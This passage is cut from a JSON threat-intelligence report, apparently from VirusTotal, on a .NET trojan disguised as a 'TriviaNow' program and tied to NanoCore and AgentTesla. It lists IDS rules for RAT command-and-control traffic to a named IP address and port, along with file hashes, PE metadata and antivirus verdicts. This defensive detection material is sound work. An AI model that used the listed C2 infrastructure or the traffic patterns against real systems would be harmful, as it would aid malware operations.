            "https://medium.com/@the_abjuri5t/nanocore-rat-hunting-guide-cb185473c1e0"
          ],
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2046909"
        },
        {
          "rule_category": "A Network Trojan was detected",
          "alert_severity": "high",
          "rule_msg": "ET MALWARE NanoCore RAT Keepalive Response 3",
          "rule_raw": "alert tcp $EXTERNAL_NET [1024:] -> $HOME_NET any (msg:\"ET MALWARE NanoCore RAT Keepalive Response 3\"; flow:established,to_client; dsize:12; content:\"|08 00 00 00|\"; depth:4; content:!\"|00 00 00 00|\"; within:4; flowbits:isset,ET.NanoCore; threshold: type both, track by_src, count 10, seconds 120; reference:md5,dd132a5f3a3b4db2c05f9fe8573a9475; reference:url,medium.com/@the_abjuri5t/nanocore-rat-hunting-guide-cb185473c1e0; classtype:trojan-activity; sid:2046911; rev:6; metadata:attack_target Client_Endpoint, created_at 2015_04_04, deployment Perimeter, former_category MALWARE, malware_family NanoCore, performance_impact Moderate, signature_severity Major, updated_at 2023_07_26, former_sid 2810451;)",
          "rule_url": "https://rules.emergingthreats.net/",
          "alert_context": [
            {
              "src_ip": "94.156.6.14",
              "src_port": 6110
            }
          ],
          "rule_references": [
            "https://www.virustotal.com/gui/search/dd132a5f3a3b4db2c05f9fe8573a9475",
            "https://medium.com/@the_abjuri5t/nanocore-rat-hunting-guide-cb185473c1e0"
          ],
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2046911"
        },
        {
          "rule_category": "Malware Command and Control Activity Detected",
          "alert_severity": "high",
          "rule_msg": "ET MALWARE NanoCore RAT CnC 7",
          "rule_raw": "alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:\"ET MALWARE NanoCore RAT CnC 7\"; flow:established,to_server; content:\"|08 00 00 00 c1 c3 d0 32 43 59 a1 78|\"; depth:12; reference:md5,2815f2a23e7383ca7821a40739f088b6; reference:url,medium.com/@the_abjuri5t/nanocore-rat-hunting-guide-cb185473c1e0; classtype:command-and-control; sid:2046914; rev:2; metadata:attack_target Client_Endpoint, created_at 2016_03_28, deployment Perimeter, former_category MALWARE, malware_family NanoCore, signature_severity Major, updated_at 2023_07_26, former_sid 2816766;)",
          "rule_url": "https://rules.emergingthreats.net/",
          "alert_context": [
            {
              "dest_port": 6110,
              "dest_ip": "94.156.6.14"
            }
          ],
          "rule_references": [
            "https://www.virustotal.com/gui/search/2815f2a23e7383ca7821a40739f088b6",
            "https://medium.com/@the_abjuri5t/nanocore-rat-hunting-guide-cb185473c1e0"
          ],
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2046914"
        },
        {
          "rule_category": "Malware Command and Control Activity Detected",
          "alert_severity": "high",
          "rule_msg": "ET MALWARE NanoCore RAT Keep-Alive Beacon (Inbound)",
          "rule_raw": "alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:\"ET MALWARE NanoCore RAT Keep-Alive Beacon (Inbound)\"; flow:established,to_client; dsize:12; content:\"|08 00 00 00 c1 c3 d0 32 43 59 a1 78|\"; fast_pattern; reference:md5,c38152f0098b7d0ad4a8de0b7b8df193; reference:url,medium.com/@the_abjuri5t/nanocore-rat-hunting-guide-cb185473c1e0; classtype:command-and-control; sid:2046917; rev:1; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2020_03_30, deployment Perimeter, former_category MALWARE, malware_family NanoCore, signature_severity Major, tag c2, updated_at 2020_03_30, former_sid 2841753, mitre_tactic_id TA0011, mitre_tactic_name Command_And_Control, mitre_technique_id T1041, mitre_technique_name Exfiltration_Over_C2_Channel;)",
          "rule_url": "https://rules.emergingthreats.net/",
          "alert_context": [
            {
              "src_ip": "94.156.6.14",
              "src_port": 6110
            }
          ],
          "rule_references": [
            "https://www.virustotal.com/gui/search/c38152f0098b7d0ad4a8de0b7b8df193",
            "https://medium.com/@the_abjuri5t/nanocore-rat-hunting-guide-cb185473c1e0"
          ],
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2046917"
        },
        {
          "rule_category": "trojan-activity",
          "alert_severity": "high",
          "rule_msg": "MALWARE-CNC Rat.Trojan.Nanocore variant cnc connection",
          "rule_raw": "alert tcp $HOME_NET any -> $EXTERNAL_NET any ( msg:\"MALWARE-CNC Rat.Trojan.Nanocore variant cnc connection\"; flow:to_server,established; content:\"|40 00 00 00 E2 DA A6 7E FB F2 28 DC C7 E5 BA 6B 61 38 B1 85 B9 F6 EB 58|\",depth 32; metadata:impact_flag red,policy balanced-ips drop,policy max-detect-ips drop,policy security-ips drop; reference:url,www.virustotal.com/gui/file/4b61697d61a8835a503f2ea6c202b338bde721644dc3ec3e41131d910c657545; classtype:trojan-activity; sid:58766; rev:1; )",
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "alert_context": [
            {
              "dest_port": 6110,
              "dest_ip": "94.156.6.14"
            }
          ],
          "rule_references": [
            "https://www.virustotal.com/gui/file/4b61697d61a8835a503f2ea6c202b338bde721644dc3ec3e41131d910c657545"
          ],
          "rule_source": "Snort registered user ruleset",
          "rule_id": "1:58766"
        },
        {
          "rule_category": "trojan-activity",
          "alert_severity": "high",
          "rule_msg": "MALWARE-CNC Rat.Trojan.Nanocore variant cnc connection",
          "rule_raw": "alert tcp $HOME_NET any -> $EXTERNAL_NET any ( msg:\"MALWARE-CNC Rat.Trojan.Nanocore variant cnc connection\"; flow:to_server,established; content:\"|08 00 00 00 B7 04 05 7C 3E 61 59 42|\",depth 12; isdataat:!0,relative; metadata:impact_flag red,policy balanced-ips drop,policy max-detect-ips drop,policy security-ips drop; reference:url,www.virustotal.com/gui/file/4b61697d61a8835a503f2ea6c202b338bde721644dc3ec3e41131d910c657545; classtype:trojan-activity; sid:58767; rev:1; )",
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "alert_context": [
            {
              "dest_port": 6110,
              "dest_ip": "94.156.6.14"
            }
          ],
          "rule_references": [
            "https://www.virustotal.com/gui/file/4b61697d61a8835a503f2ea6c202b338bde721644dc3ec3e41131d910c657545"
          ],
          "rule_source": "Snort registered user ruleset",
          "rule_id": "1:58767"
        },
        {
          "rule_category": "trojan-activity",
          "alert_severity": "high",
          "rule_msg": "MALWARE-CNC Rat.Trojan.Nanocore variant cnc connection",
          "rule_raw": "alert tcp $HOME_NET any -> $EXTERNAL_NET any ( msg:\"MALWARE-CNC Rat.Trojan.Nanocore variant cnc connection\"; flow:to_server,established; content:\"|08 00 00 00 C1 C3 D0 32 43 59 A1 78|\",depth 12; isdataat:!0,relative; metadata:impact_flag red,policy balanced-ips drop,policy max-detect-ips drop,policy security-ips drop; reference:url,www.virustotal.com/gui/file/4b61697d61a8835a503f2ea6c202b338bde721644dc3ec3e41131d910c657545; classtype:trojan-activity; sid:58769; rev:1; )",
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "alert_context": [
            {
              "dest_port": 6110,
              "dest_ip": "94.156.6.14"
            }
          ],
          "rule_references": [
            "https://www.virustotal.com/gui/file/4b61697d61a8835a503f2ea6c202b338bde721644dc3ec3e41131d910c657545"
          ],
          "rule_source": "Snort registered user ruleset",
          "rule_id": "1:58769"
        },
        {
          "rule_category": "trojan-activity",
          "alert_severity": "high",
          "rule_msg": "MALWARE-CNC Rat.Trojan.Nanocore variant cnc connection",
          "rule_raw": "alert tcp $EXTERNAL_NET any -> $HOME_NET any ( msg:\"MALWARE-CNC Rat.Trojan.Nanocore variant cnc connection\"; flow:to_client,established; content:\"|20 00 00 00 E2 DA A6 7E FB F2 28 DC C7 E5 BA 6B 61 38 B1 85 B9 F6 EB 58 BF 12 FA A6 29 68 41 01 FB D1 42 A2|\",depth 36; isdataat:!0,relative; metadata:impact_flag red,policy balanced-ips drop,policy max-detect-ips drop,policy security-ips drop; reference:url,www.virustotal.com/gui/file/4b61697d61a8835a503f2ea6c202b338bde721644dc3ec3e41131d910c657545; classtype:trojan-activity; sid:58770; rev:1; )",
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "alert_context": [
            {
              "src_ip": "94.156.6.14",
              "src_port": 6110
            }
          ],
          "rule_references": [
            "https://www.virustotal.com/gui/file/4b61697d61a8835a503f2ea6c202b338bde721644dc3ec3e41131d910c657545"
          ],
          "rule_source": "Snort registered user ruleset",
          "rule_id": "1:58770"
        },
        {
          "rule_category": "Potentially Bad Traffic",
          "alert_severity": "low",
          "rule_msg": "ET INFO DYNAMIC_DNS Query to a *.sytes.net Domain",
          "rule_raw": "alert dns $HOME_NET any -> any any (msg:\"ET INFO DYNAMIC_DNS Query to a *.sytes.net Domain\"; dns.query; content:\".sytes.net\"; fast_pattern; nocase; endswith; reference:url,www.trendmicro.com/en_us/research/23/b/earth-kitsune-delivers-new-whiskerspy-backdoor.html; classtype:bad-unknown; sid:2044233; rev:11; metadata:created_at 2012_03_05, former_category INFO, updated_at 2020_09_17, former_sid 2804633;)",
          "rule_url": "https://rules.emergingthreats.net/",
          "alert_context": [
            {
              "dest_port": 53,
              "dest_ip": "8.8.8.8"
            }
          ],
          "rule_references": [
            "https://www.trendmicro.com/en_us/research/23/b/earth-kitsune-delivers-new-whiskerspy-backdoor.html"
          ],
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2044233"
        }
      ],
      "last_analysis_date": 1698537632,
      "unique_sources": 11,
      "first_submission_date": 1697453145,
      "sha1": "6cdc821855a5244b4cef53ce9004ae95ff1daa14",
      "ssdeep": "12288:hzfqBu0XjKmiBCYNJBGqPhW6MWU3ZAyXTR51Mc+A+t:hT6GBCYlPhW6q3ZV+",
      "packers": {
        "PEiD": ".NET executable"
      },
      "md5": "cc4785f780b286ccdaf01c38bbbc809d",
      "dot_net_assembly": {
        "entry_point_rva": 35588,
        "metadata_header_rva": 21504,
        "manifest_resource": [
          "TriviaNow.DataEntry.resources",
          "TriviaNow.Game.resources",
          "TriviaNow.Properties.Resources.resources",
          "TriviaNow.QuestionDetails.resources"
        ],
        "assembly_flags": 3,
        "strongname_va": 0,
        "tables_rows_map_log": "48688897744567645545",
        "external_assemblies": {
          "Microsoft.VisualBasic": {
            "version": "10.0.0.0"
          },
          "mscorlib": {
            "version": "4.0.0.0"
          },
          "System": {
            "version": "4.0.0.0"
          },
          "System.Drawing": {
            "version": "4.0.0.0"
          },
          "System.Windows.Forms": {
            "version": "4.0.0.0"
          },
          "System.Core": {
            "version": "4.0.0.0"
          }
        },
        "type_definition_list": [
          {
            "type_definitions": [
              "EventHandler",
              "Object",
              "EventArgs",
              "Exception",
              "Random",
              "Func`2",
              "Type",
              "STAThreadAttribute",
              "Delegate",
              "String",
              "Int32",
              "Convert",
              "IDisposable",
              "RuntimeTypeHandle",
              "Environment",
              "AppDomain"
            ],
            "namespace": "System"
          },
          {
            "type_definitions": [
              "ComVisibleAttribute",
              "GuidAttribute"
            ],
            "namespace": "System.Runtime.InteropServices"
          },
          {
            "type_definitions": [
              "BinaryFormatter"
            ],
            "namespace": "System.Runtime.Serialization.Formatters.Binary"
          },
          {
            "type_definitions": [
              "AssemblyTitleAttribute",
              "AssemblyDescriptionAttribute",
              "AssemblyConfigurationAttribute",
              "AssemblyCompanyAttribute",
              "AssemblyProductAttribute",
              "AssemblyCopyrightAttribute",
              "AssemblyTrademarkAttribute",
              "AssemblyFileVersionAttribute",
              "Assembly",
              "MethodInfo",
              "MethodBase"
            ],
            "namespace": "System.Reflection"
          },
          {
            "type_definitions": [
              "Enumerable"
            ],
            "namespace": "System.Linq"
          },
          {
            "type_definitions": [
              "IContainer",
              "ComponentResourceManager",
              "BindingList`1",
              "EditorBrowsableState",
              "EditorBrowsableAttribute",
              "ISupportInitialize",
              "Container"
            ],
            "namespace": "System.ComponentModel"
          },
          {
            "type_definitions": [
              "GeneratedCodeAttribute"
            ],
            "namespace": "System.CodeDom.Compiler"
          },
          {
            "type_definitions": [
              "ResourceManager"
            ],
            "namespace": "System.Resources"
          },
          {
            "type_definitions": [
              "DebuggingModes",
              "ControlCollection"
            ],
            "namespace": "uncategorized"
          },
          {
            "type_definitions": [
              "Interaction",
              "CallType"
            ],
            "namespace": "Microsoft.VisualBasic"
          },
          {
            "type_definitions": [
              "CompilationRelaxationsAttribute",
              "RuntimeCompatibilityAttribute",
              "CompilerGeneratedAttribute"
            ],
            "namespace": "System.Runtime.CompilerServices"
          },
          {
            "type_definitions": [
              "Interlocked"
            ],
            "namespace": "System.Threading"
          },
          {
            "type_definitions": [
              "TargetFrameworkAttribute"
            ],
            "namespace": "System.Runtime.Versioning"
          },
          {
            "type_definitions": [
              "List`1",
              "IEnumerator`1",
              "IEnumerable`1"
            ],
            "namespace": "System.Collections.Generic"
          },
          {
            "type_definitions": [
              "ApplicationSettingsBase",
              "SettingsBase"
            ],
            "namespace": "System.Configuration"
          },
          {
            "type_definitions": [
              "CultureInfo"
            ],
            "namespace": "System.Globalization"
          },
          {
            "type_definitions": [
              "DebuggableAttribute",
              "DebuggerBrowsableState",
              "DebuggerBrowsableAttribute",
              "DebuggerNonUserCodeAttribute"
            ],
            "namespace": "System.Diagnostics"
          },
          {
            "type_definitions": [
              "IEnumerator"
            ],
            "namespace": "System.Collections"
          },
          {
            "type_definitions": [
              "FileStream",
              "FileMode",
              "FileAccess",
              "Stream"
            ],
            "namespace": "System.IO"
          },
          {
            "type_definitions": [
              "Bitmap",
              "Point",
              "Size",
              "SizeF",
              "Image",
              "Color"
            ],
            "namespace": "System.Drawing"
          },
          {
            "type_definitions": [
              "Collection`1"
            ],
            "namespace": "System.Collections.ObjectModel"
          },
          {
            "type_definitions": [
              "Form",
              "GroupBox",
              "TextBox",
              "Label",
              "ComboBox",
              "Button",
              "PictureBox",
              "MenuStrip",
              "ToolStripMenuItem",
              "ListBox",
              "SaveFileDialog",
              "OpenFileDialog",
              "StatusStrip",
              "ToolStripStatusLabel",
              "Timer",
              "DialogResult",
              "Control",
              "MessageBox",
              "ListControl",
              "TextBoxBase",
              "ButtonBase",
              "ContainerControl",
              "AutoScaleMode",
              "ImageLayout",
              "FileDialog",
              "CommonDialog",
              "ToolStripItem",
              "ToolStrip",
              "ToolStripItemCollection",
              "ToolStripDropDownItem",
              "Application"
            ],
            "namespace": "System.Windows.Forms"
          },
          {
            "type_definitions": [
              "SoundPlayer"
            ],
            "namespace": "System.Media"
          }
        ],
        "entry_point_token": 100663343,
        "tables_rows_map": "167a04e04404a0a601f0000181024091300700001006000041030",
        "assembly_flags_txt": "COMIMAGE_FLAGS_ILONLY, COMIMAGE_FLAGS_32BITREQUIRED",
        "assembly_name": "YcGF.exe",
        "streams": {
          "#~": {
            "chi2": 135319.75,
            "size": 4388,
            "entropy": 5.208333969116211,
            "md5": "68360e6f5fe76836c461272f040a4b9f"
          },
          "#Strings": {
            "chi2": 60748.9921875,
            "size": 5160,
            "entropy": 4.850715637207031,
            "md5": "defc3d29477148a7d8fd3a1a643b210e"
          },
          "#US": {
            "chi2": 193011.71875,
            "size": 2940,
            "entropy": 3.6501004695892334,
            "md5": "e732c5d62466c2e6e0d467d159800564"
          },
          "#GUID": {
            "chi2": 240,
            "size": 16,
            "entropy": 4,
            "md5": "b5c6f3ea9e0d089e2eefe3b3c325461d"
          },
          "#Blob": {
            "chi2": 12468.859375,
            "size": 1472,
            "entropy": 5.573357582092285,
            "md5": "489fa9f518f92197db430482b646d3d3"
          }
        },
        "tables_present": 20,
        "clr_version": "v4.0.30319",
        "assembly_data": {
          "majorversion": 1,
          "minorversion": 0,
          "hashalgid": 32772,
          "flags_text": "afPA_None",
          "buildnumber": 0,
          "flags": 0,
          "revisionnumber": 0,
          "name": "YcGF"
        },
        "clr_meta_version": "1.1",
        "tables_present_map": "b0909b61557",
        "resources_va": 593152
      },
      "pe_info": {
        "resource_details": [
          {
            "lang": "NEUTRAL",
            "entropy": 3.284041166305542,
            "chi2": 66291.31,
            "filetype": "unknown",
            "sha256": "f62ca0d3ff0618d0115492d816d988ffb33309f26a85e8142a7d29e36607db48",
            "type": "RT_VERSION"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.00111722946167,
            "chi2": 4719.86,
            "filetype": "unknown",
            "sha256": "539dc26a14b6277e87348594ab7d6e932d16aabb18612d77f29fe421a9f1d46a",
            "type": "RT_MANIFEST"
          }
        ],
        "resource_types": {
          "RT_MANIFEST": 1,
          "RT_VERSION": 1
        },
        "imphash": "f34d5f2d4577ed6d9ceec516c1f5a744",
        "resource_langs": {
          "NEUTRAL": 2
        },
        "machine_type": 332,
        "timestamp": 1697451919,
        "entry_point": 634346,
        "sections": [
          {
            "name": ".text",
            "chi2": 39009.59,
            "virtual_address": 8192,
            "flags": "rx",
            "raw_size": 626176,
            "entropy": 7.97,
            "virtual_size": 626160,
            "md5": "47d81e27d9a23d6bc02adc34394ee8f9"
          },
          {
            "name": ".rsrc",
            "chi2": 80158.51,
            "virtual_address": 638976,
            "flags": "r",
            "raw_size": 1536,
            "entropy": 4.07,
            "virtual_size": 1436,
            "md5": "b7085f0bf7a6e0bce6a8dba9190eb3ce"
          },
          {
            "name": ".reloc",
            "chi2": 128015,
            "virtual_address": 647168,
            "flags": "r",
            "raw_size": 512,
            "entropy": 0.1,
            "virtual_size": 12,
            "md5": "c4fa4d62ebd89567f150363ec346668a"
          }
        ],
        "import_list": [
          {
            "library_name": "mscoree.dll",
            "imported_functions": [
              "_CorExeMain"
            ]
          }
        ]
      },
      "magic": "PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 4,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 55,
        "undetected": 17
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "malicious",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": "W32.Common.E13BF481",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": "Trojan.Win32.Agensla.4!c",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "tehtris": {
          "category": "undetected",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231029"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "Trojan.GenericKD.69820194",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230822"
        },
        "CAT-QuickHeal": {
          "category": "malicious",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": "Trojan.IGENERIC",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Skyhigh": {
          "category": "malicious",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": "BehavesLike.Win32.Generic.jc",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "ALYac": {
          "category": "malicious",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "result": "Trojan.GenericKD.69820194",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Malwarebytes": {
          "category": "malicious",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": "Trojan.MalPack.PNG.Generic",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": "Trojan.GenericKD.69820194",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Sangfor": {
          "category": "malicious",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": "Suspicious.Win32.Save.a",
          "method": "blacklist",
          "engine_update": "20231026"
        },
        "CrowdStrike": {
          "category": "malicious",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": "win/malicious_confidence_100% (W)",
          "method": "blacklist",
          "engine_update": "20220812"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "Trojan.GenericKD.69820194",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "K7GW": {
          "category": "malicious",
          "engine_name": "K7GW",
          "engine_version": "12.121.50029",
          "result": "Riskware ( 00584baa1 )",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "K7AntiVirus": {
          "category": "malicious",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.121.50029",
          "result": "Riskware ( 00584baa1 )",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "VirIT": {
          "category": "malicious",
          "engine_name": "VirIT",
          "engine_version": "9.5.567",
          "result": "Trojan.Win32.MSIL_Heur.A",
          "method": "blacklist",
          "engine_update": "20231027"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230119"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "result": "Scr.Malcode!gdn34",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Elastic": {
          "category": "malicious",
          "engine_name": "Elastic",
          "engine_version": "4.0.112",
          "result": "malicious (high confidence)",
          "method": "blacklist",
          "engine_update": "20231020"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "28149",
          "result": "a variant of MSIL/GenKryptik.GPAK",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Cynet": {
          "category": "malicious",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.27",
          "result": "Malicious (score: 100)",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "APEX": {
          "category": "malicious",
          "engine_name": "APEX",
          "engine_version": "6.469",
          "result": "Malicious",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Paloalto": {
          "category": "undetected",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231029"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": "HEUR:Trojan-PSW.MSIL.Agensla.gen",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Alibaba": {
          "category": "malicious",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": "TrojanPSW:MSIL/Agensla.f1918e05",
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "NANO-Antivirus": {
          "category": "malicious",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": "Trojan.Win32.Agensla.kcowqw",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": "Malware.Obfus/MSIL@AI.100 (RDM.MSIL2:6qCnKf/Uzmm8zuvXZrd+RA)",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231029"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2023-10-27.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231027"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": "Trojan.GenericKD.69820194 (B)",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "F-Secure": {
          "category": "malicious",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "result": "Trojan.TR/Kryptik.degze",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "DrWeb": {
          "category": "malicious",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": "Trojan.DownLoaderNET.710",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.4983",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231027"
        },
        "TrendMicro": {
          "category": "malicious",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": "TROJ_GEN.R002C0XJM23",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Trapmine": {
          "category": "undetected",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.94",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "FireEye": {
          "category": "malicious",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": "Trojan.GenericKD.69820194",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "2.3.1.0",
          "result": "Troj/Krypt-ABH",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": "Trojan.MSIL.Agent",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "231028-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Webroot": {
          "category": "malicious",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": "W32.Infostealer.Agenttesla",
          "method": "blacklist",
          "engine_update": "20231029"
        },
        "Varist": {
          "category": "malicious",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": "W32/MSIL_Kryptik.JZA.gen!Eldorado",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Avira": {
          "category": "malicious",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": "TR/Kryptik.degze",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Antiy-AVL": {
          "category": "malicious",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": "Trojan/MSIL.GenKryptik",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Kingsoft": {
          "category": "undetected",
          "engine_name": "Kingsoft",
          "engine_version": "2023.8.30.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23090.2007",
          "result": "Trojan:Win32/Znyonm",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Gridinsoft": {
          "category": "malicious",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.144.174",
          "result": "Trojan.Win32.NanoCore.bot",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Xcitium": {
          "category": "malicious",
          "engine_name": "Xcitium",
          "engine_version": "36126",
          "result": "Malware@#2s3n6iva48gpq",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": "Trojan.Generic.D4295F22",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "HEUR:Trojan-PSW.MSIL.Agensla.gen",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.36732B:27.33667",
          "result": "Trojan.GenericKD.69820194",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1698530434",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20231029"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230921"
        },
        "AhnLab-V3": {
          "category": "malicious",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.24.0.10447",
          "result": "Trojan/Win.Injection.C5512597",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "McAfee": {
          "category": "malicious",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": "AgentTesla!CC4785F780B2",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "MAX": {
          "category": "malicious",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": "malware (ai score=81)",
          "method": "blacklist",
          "engine_update": "20231029"
        },
        "DeepInstinct": {
          "category": "malicious",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": "MALICIOUS",
          "method": "blacklist",
          "engine_update": "20231019"
        },
